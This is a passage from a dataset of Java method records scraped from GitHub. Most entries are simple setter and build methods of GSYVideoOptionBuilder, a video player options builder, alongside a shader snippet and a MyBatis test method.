color.b));\\n\"                + \"  if (dst_energy > max_energy) {\\n\"                + \"    dst_energy = max_energy;\\n\"                + \"  }\\n\"                + \"  if (energy == 0.0) {\\n\"                + \"    gl_FragColor = color;\\n\"                + \"  } else {\\n\"                + \"    gl_FragColor = vec4(color.rgb * dst_energy / energy, color.a);\\n\"                + \"  }\\n\" + \"}\\n\";        return shader;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/AutoFixEffect.java", "stars": "2", "class": {"name": "AutoFixEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getConfiguration", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "  protected String getConfiguration() {    return \"default\";  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/DefaultLazyTest.java", "stars": "15", "class": {"name": "DefaultLazyTest", "extends": "AbstractLazyTest", "implements": null, "modifiers": ["public"]}}, {"method_name": "setAutoFullWithSize", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setAutoFullWithSize(boolean autoFullWithSize) {        this.mAutoFullWithSize = autoFullWithSize;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setShowFullAnimation", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setShowFullAnimation(boolean showFullAnimation) {        this.mShowFullAnimation = showFullAnimation;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setLooping", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setLooping(boolean looping) {        this.mLooping = looping;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setVideoAllCallBack", "params": ["VideoAllCallBack"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setVideoAllCallBack(VideoAllCallBack mVideoAllCallBack) {        this.mVideoAllCallBack = mVideoAllCallBack;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setRotateViewAuto", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setRotateViewAuto(boolean rotateViewAuto) {        this.mRotateViewAuto = rotateViewAuto;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setLockLand", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setLockLand(boolean lockLand) {        this.mLockLand = lockLand;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSpeed", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setSpeed(float speed) {        this.mSpeed = speed;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSoundTouch", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setSoundTouch(boolean soundTouch) {        this.mSounchTouch = soundTouch;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setHideKey", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setHideKey(boolean hideKey) {        this.mHideKey = hideKey;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setIsTouchWiget", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setIsTouchWiget(boolean isTouchWiget) {        this.mIsTouchWiget = isTouchWiget;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setIsTouchWigetFull", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setIsTouchWigetFull(boolean isTouchWigetFull) {        this.mIsTouchWigetFull = isTouchWigetFull;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setNeedShowWifiTip", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setNeedShowWifiTip(boolean needShowWifiTip) {        this.mNeedShowWifiTip = needShowWifiTip;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setEnlargeImageRes", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setEnlargeImageRes(int mEnlargeImageRes) {        this.mEnlargeImageRes = mEnlargeImageRes;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setShrinkImageRes", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setShrinkImageRes(int mShrinkImageRes) {        this.mShrinkImageRes = mShrinkImageRes;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setShowPauseCover", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setShowPauseCover(boolean showPauseCover) {        this.mShowPauseCover = showPauseCover;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSeekRatio", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setSeekRatio(float seekRatio) {        if (seekRatio < 0) {            return this;        }        this.mSeekRatio = seekRatio;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setRotateWithSystem", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setRotateWithSystem(boolean rotateWithSystem) {        this.mRotateWithSystem = rotateWithSystem;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setPlayTag", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setPlayTag(String playTag) {        this.mPlayTag = playTag;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setPlayPosition", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setPlayPosition(int playPosition) {        this.mPlayPosition = playPosition;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSeekOnStart", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setSeekOnStart(long seekOnStart) {        this.mSeekOnStart = seekOnStart;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUrl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setUrl(String url) {        this.mUrl = url;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setVideoTitle", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setVideoTitle(String videoTitle) {        this.mVideoTitle = videoTitle;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCacheWithPlay", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setCacheWithPlay(boolean cacheWithPlay) {        this.mCacheWithPlay = cacheWithPlay;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setStartAfterPrepared", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setStartAfterPrepared(boolean startAfterPrepared) {        this.mStartAfterPrepared = startAfterPrepared;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setReleaseWhenLossAudio", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setReleaseWhenLossAudio(boolean releaseWhenLossAudio) {        this.mReleaseWhenLossAudio = releaseWhenLossAudio;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCachePath", "params": ["File"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setCachePath(File cachePath) {        this.mCachePath = cachePath;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setMapHeadData", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setMapHeadData(Map<String, String> mapHeadData) {        this.mMapHeadData = mapHeadData;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setGSYVideoProgressListener", "params": ["GSYVideoProgressListener"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setGSYVideoProgressListener(GSYVideoProgressListener videoProgressListener) {        this.mGSYVideoProgressListener = videoProgressListener;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setThumbImageView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setThumbImageView(View view) {        mThumbImageView = view;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setBottomShowProgressBarDrawable", "params": ["Drawable", "Drawable"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setBottomShowProgressBarDrawable(Drawable drawable, Drawable thumb) {        mBottomShowProgressDrawable = drawable;        mBottomShowProgressThumbDrawable = thumb;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setBottomProgressBarDrawable", "params": ["Drawable"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setBottomProgressBarDrawable(Drawable drawable) {        mBottomProgressDrawable = drawable;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDialogVolumeProgressBar", "params": ["Drawable"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setDialogVolumeProgressBar(Drawable drawable) {        mVolumeProgressDrawable = drawable;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDialogProgressBar", "params": ["Drawable"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setDialogProgressBar(Drawable drawable) {        mDialogProgressBarDrawable = drawable;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDialogProgressColor", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setDialogProgressColor(int highLightColor, int normalColor) {        mDialogProgressHighLightColor = highLightColor;        mDialogProgressNormalColor = normalColor;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setThumbPlay", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setThumbPlay(boolean thumbPlay) {        this.mThumbPlay = thumbPlay;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setNeedLockFull", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setNeedLockFull(boolean needLoadFull) {        this.mNeedLockFull = needLoadFull;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setLockClickListener", "params": ["LockClickListener"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setLockClickListener(LockClickListener lockClickListener) {        this.mLockClickListener = lockClickListener;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDismissControlTime", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setDismissControlTime(int dismissControlTime) {        this.mDismissControlTime = dismissControlTime;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setEffectFilter", "params": ["GSYVideoGLView"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setEffectFilter(GSYVideoGLView.ShaderInterface effectFilter) {        this.mEffectFilter = effectFilter;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setOverrideExtension", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setOverrideExtension(String overrideExtension) {        this.mOverrideExtension = overrideExtension;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setOnlyRotateLand", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setOnlyRotateLand(boolean onlyRotateLand) {        this.mIsOnlyRotateLand = onlyRotateLand;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSetUpLazy", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setSetUpLazy(boolean setUpLazy) {        this.mSetUpLazy = setUpLazy;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setFullHideActionBar", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setFullHideActionBar(boolean actionBar) {        this.mActionBar = actionBar;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setFullHideStatusBar", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder setFullHideStatusBar(boolean statusBar) {        this.mStatusBar = statusBar;        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "build", "params": ["StandardGSYVideoPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void build(StandardGSYVideoPlayer gsyVideoPlayer) {        if (mBottomShowProgressDrawable != null && mBottomShowProgressThumbDrawable != null) {            gsyVideoPlayer.setBottomShowProgressBarDrawable(mBottomShowProgressDrawable, mBottomShowProgressThumbDrawable);        }        if (mBottomProgressDrawable != null) {            gsyVideoPlayer.setBottomProgressBarDrawable(mBottomProgressDrawable);        }        if (mVolumeProgressDrawable != null) {            gsyVideoPlayer.setDialogVolumeProgressBar(mVolumeProgressDrawable);        }        if (mDialogProgressBarDrawable != null) {            gsyVideoPlayer.setDialogProgressBar(mDialogProgressBarDrawable);        }        if (mDialogProgressHighLightColor > 0 && mDialogProgressNormalColor > 0) {            gsyVideoPlayer.setDialogProgressColor(mDialogProgressHighLightColor, mDialogProgressNormalColor);        }        build((GSYBaseVideoPlayer) gsyVideoPlayer);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "build", "params": ["GSYBaseVideoPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void build(GSYBaseVideoPlayer gsyVideoPlayer) {        gsyVideoPlayer.setPlayTag(mPlayTag);        gsyVideoPlayer.setPlayPosition(mPlayPosition);        gsyVideoPlayer.setThumbPlay(mThumbPlay);        if (mThumbImageView != null) {            gsyVideoPlayer.setThumbImageView(mThumbImageView);        }        gsyVideoPlayer.setNeedLockFull(mNeedLockFull);        if (mLockClickListener != null) {            gsyVideoPlayer.setLockClickListener(mLockClickListener);        }        gsyVideoPlayer.setDismissControlTime(mDismissControlTime);        if (mSeekOnStart > 0) {            gsyVideoPlayer.setSeekOnStart(mSeekOnStart);        }        gsyVideoPlayer.setShowFullAnimation(mShowFullAnimation);        gsyVideoPlayer.setLooping(mLooping);        if (mVideoAllCallBack != null) {            gsyVideoPlayer.setVideoAllCallBack(mVideoAllCallBack);        }        if (mGSYVideoProgressListener != null) {            gsyVideoPlayer.setGSYVideoProgressListener(mGSYVideoProgressListener);        }        gsyVideoPlayer.setOverrideExtension(mOverrideExtension);        gsyVideoPlayer.setAutoFullWithSize(mAutoFullWithSize);        gsyVideoPlayer.setRotateViewAuto(mRotateViewAuto);        gsyVideoPlayer.setOnlyRotateLand(mIsOnlyRotateLand);        gsyVideoPlayer.setLockLand(mLockLand);        gsyVideoPlayer.setSpeed(mSpeed, mSounchTouch);        gsyVideoPlayer.setHideKey(mHideKey);        gsyVideoPlayer.setIsTouchWiget(mIsTouchWiget);        gsyVideoPlayer.setIsTouchWigetFull(mIsTouchWigetFull);        gsyVideoPlayer.setNeedShowWifiTip(mNeedShowWifiTip);        gsyVideoPlayer.setEffectFilter(mEffectFilter);        gsyVideoPlayer.setStartAfterPrepared(mStartAfterPrepared);        gsyVideoPlayer.setReleaseWhenLossAudio(mReleaseWhenLossAudio);        gsyVideoPlayer.setFullHideActionBar(mActionBar);        gsyVideoPlayer.setFullHideStatusBar(mStatusBar);        if (mEnlargeImageRes > 0) {            gsyVideoPlayer.setEnlargeImageRes(mEnlargeImageRes);        }        if (mShrinkImageRes > 0) {            gsyVideoPlayer.setShrinkImageRes(mShrinkImageRes);        }        gsyVideoPlayer.setShowPauseCover(mShowPauseCover);        gsyVideoPlayer.setSeekRatio(mSeekRatio);        gsyVideoPlayer.setRotateWithSystem(mRotateWithSystem);        if (mSetUpLazy) {            gsyVideoPlayer.setUpLazy(mUrl, mCacheWithPlay, mCachePath, mMapHeadData, mVideoTitle);        } else {            gsyVideoPlayer.setUp(mUrl, mCacheWithPlay, mCachePath, mMapHeadData, mVideoTitle);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/builder/GSYVideoOptionBuilder.java", "stars": "2", "class": {"name": "GSYVideoOptionBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": 